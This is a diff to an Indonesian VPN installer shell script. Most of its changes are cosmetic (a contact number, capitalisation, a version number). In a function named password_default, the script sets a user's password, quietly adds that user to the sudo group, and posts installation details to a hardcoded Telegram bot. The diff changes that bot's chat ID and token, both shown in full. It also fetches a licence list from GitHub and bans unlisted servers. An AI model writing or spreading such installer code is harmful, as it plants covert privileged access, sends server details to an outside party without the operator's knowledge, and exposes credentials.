@@ -50,7 +50,7 @@ checking_sc() {
     echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
     echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
     echo -e "             \033[0;33mContact Admin :${NC}"
-    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6281774970898"
+    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6282390824122"
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
     sleep 5
     exit
@@ -132,7 +132,7 @@ mai="datediff "$Exp" "$DATE""
 
 # Status ExpiRED Active | Geo Project
 Info="(${green}Active${NC})"
-Error="(${RED}ExpiRED${NC})"
+Error="(${RED}Expired${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
 Exp1=$(curl https://raw.githubusercontent.com/octseventen/izin-script/main/ip | grep $MYIP | awk '{print $4}')
 if [[ $today < $Exp1 ]]; then
@@ -140,7 +140,7 @@ sts="${Info}"
 else
 sts="${Error}"
 fi
-echo -e "\e[32mloading...\e[0m"
+echo -e "\e[32mLoading...\e[0m"
 clear
 
 # REPO    
@@ -302,7 +302,7 @@ clear
 echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
 echo -e "   '----------------------------------'"
 echo -e "     \e[1;32m1)\e[0m Menggunakan Domain Sendiri"
-echo -e "     \e[1;32m2)\e[0m Menggunakan domain Random"
+echo -e "     \e[1;32m2)\e[0m Menggunakan Domain Random"
 echo -e "   ------------------------------------"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
@@ -339,11 +339,11 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="5366632772"
-    KEY="6359278345:AAEHaXzhZf0KFRBBJeqlcRGYoJFeV1Cbbls"
+    CHATID="944278308"
+    KEY="6945742728:AAEQezTRgru648u5ksEUIQiC8tU7L22I7Do"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script Stable V3.0
+    TEXT="Installasi VPN Script Stable V3.1
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
